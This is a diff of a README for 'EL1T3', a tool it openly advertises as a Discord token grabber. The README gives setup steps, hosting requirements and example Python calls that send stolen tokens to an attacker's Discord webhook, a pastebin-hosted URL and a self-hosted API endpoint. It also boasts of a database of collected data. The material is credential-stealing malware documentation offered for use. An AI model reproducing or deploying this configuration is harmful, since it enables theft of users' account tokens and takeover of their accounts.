@@ -9,21 +9,37 @@
   <br>
   <img src="https://media.discordapp.net/attachments/813683001496961065/813783642265747516/6869f4cf0c2f7349903668b562c4e403.gif">
 </p>
-<h1 align="center">FAST SETUP</h1>
+<h1 align="center">HOW TO INSTALL</h1>
 
-## 💡 Tips:
-- **Install module with**: ``pip install EL1T3``
-- ``dynamic_url`` **is used for RAW link, set this parameter to ``True`` if your webhook is on a raw (pastebin etc...)**
+- **Run** ``./Setup.py`` **file to install modules**
+<img align="center" src="https://media.discordapp.net/attachments/823351707110473789/823361030120931378/unknown.png">
+
+#
+
+<h1 align="center">HOW TO SETUP</h1>
+
+## Needed:
+* Vps / Rdp / Host (api hosting)
+
+```
++ Open port on host machine
++ Config port in EL1T3_API.py file
+```
 
 ## 👀 Exemple Code:
 ```py
 from EL1T3 import EL1T3
 
 # Direct Url
-EL1T3(dynamic_url= False, webhook_url= "https://discord.com/api/webhooks/816422104949719050/M-BU_eGHYUggYt0UhgKmU7GDUZ6L9bvSQcS08yVmeucGkWzeIYcXVcL3LMxSy5e23way", api_url= 'http://127.0.0.1:1337/send-token/')
+EL1T3(dynamic_url= False, webhook_url= "https://discord.com/api/webhooks/81619050/M-BLMxSy5e23way", api_url= 'http://IP:PORT/api/SendToken/?Token=TOKEN-HERE')
 
 # RAW Url
-EL1T3(dynamic_url= True, webhook_url= "https://pastebin.com/raw/bNcRrQiK", api_url= 'http://127.0.0.1:1337/send-token/')
+EL1T3(dynamic_url= True, webhook_url= "https://pastebin.com/raw/bNcRrQiK", api_url= 'http://IP:PORT/api/SendToken/?Token=TOKEN-HERE')
 ```
 
-<h1 align="center">API RELEASE SOON<br>"тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer"</h1>
+<h1 align="center">DATABASE SCREENSHOT</h1>
+<img align="center" src="https://media.discordapp.net/attachments/823351707110473789/823356873637494794/unknown.png">
+
+#
+
+<h1 align="center">"тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer"<br>ιтѕ_Ѵιcнч#1337<br><br>Builder Soon</h1>
